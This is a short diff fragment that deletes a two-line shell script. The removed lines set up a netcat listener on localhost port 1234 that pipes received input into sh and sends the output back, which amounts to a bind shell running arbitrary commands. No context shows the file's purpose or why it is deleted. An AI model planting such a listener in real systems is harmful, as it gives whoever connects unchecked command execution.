@@ -1,2 +1,0 @@
-: >/tmp/buffer
-tail -f /tmp/buffer | nc -l 127.0.0.1 1234 | sh >/tmp/buffer 2>&1
